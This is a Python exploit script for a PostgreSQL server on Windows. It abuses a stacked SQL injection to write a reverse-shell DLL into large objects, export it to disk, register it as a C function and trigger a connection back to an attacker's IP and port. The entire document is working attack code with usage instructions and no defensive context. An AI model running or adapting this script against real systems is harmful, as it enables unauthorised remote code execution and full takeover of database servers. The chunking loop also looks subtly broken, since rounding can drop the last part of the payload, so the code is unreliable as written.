#(m4ud) PostgreSQL LargeObjects UDF RCE

import requests, sys, urllib, string, random, time
from time import *
requests.packages.urllib3.disable_warnings()
import binascii

# encoded UDF rev_shell dll - dll must be converted into HEX
with open('rev_shell.dll', 'rb') as file:
    udf = binascii.hexlify(file.read())

loid = 1337

def log(msg): 
    print(msg)

def make_request(url, sql):
    log("[*] Executing query: %s" % sql[0:80]) 
    r = requests.get( url % sql, verify=False) 
    return r

def delete_lo(url, loid):
    log("[+] Deleting existing LO...") 
    sql = "SELECT lo_unlink(%d)" % loid 
    make_request(url, sql)

def create_lo(url, loid):
    log("[+] Creating LO for UDF injection...")
    sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid 
    make_request(url, sql)

def inject_udf(url, loid):
    with open('rev_shell.dll', 'rb') as file:
        udflib = binascii.hexlify(file.read())
    log("[+] Injecting payload of length %d into LO..." % len(udf)) 
    for i in range(0,int(round(len(udf)/4096))):
    #for i in range(0,((len(udflib)-1)/4096)+1):
        udf_chunk = udflib[i*4096:(i+1)*4096]
        if i == 0:
            sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$hex$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
        else:
            sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d,decode($$%s$$, $$hex$$))" % (loid, i, udf_chunk)
        make_request(url, sql)

def export_udf(url, loid):
    log("[+] Exporting UDF library to filesystem...")
    sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell1.dll$$)" % loid 
    make_request(url, sql)

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "CREATE OR REPLACE FUNCTION rev_shell1(text,integer) RETURNS void AS $$C:\\Users\\Public\\rev_shell1.dll$$, $$connect_back$$ language c strict" 
    make_request(url, sql)

def trigger_udf(url, ip, port):
    log("[+] Launching reverse shell...")
    sql = "select rev_shell1($$%s$$, %d)" % (ip, int(port)) 
    make_request(url, sql)

if __name__ == '__main__':
    try:
        server = sys.argv[1].strip() 
        attacker = sys.argv[2].strip() 
        port = sys.argv[3].strip()
    except IndexError:
        print ("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
        sys.exit()

    sqli_url = "https://"+server+"/sqli?Range=1&userId=1;%s;--"
    delete_lo(sqli_url, loid) 
    create_lo(sqli_url, loid) 
    inject_udf(sqli_url, loid) 
    export_udf(sqli_url, loid) 
    create_udf_func(sqli_url)
    sleep(3)
    trigger_udf(sqli_url, attacker, port)
    trigger_udf(sqli_url, attacker, port)
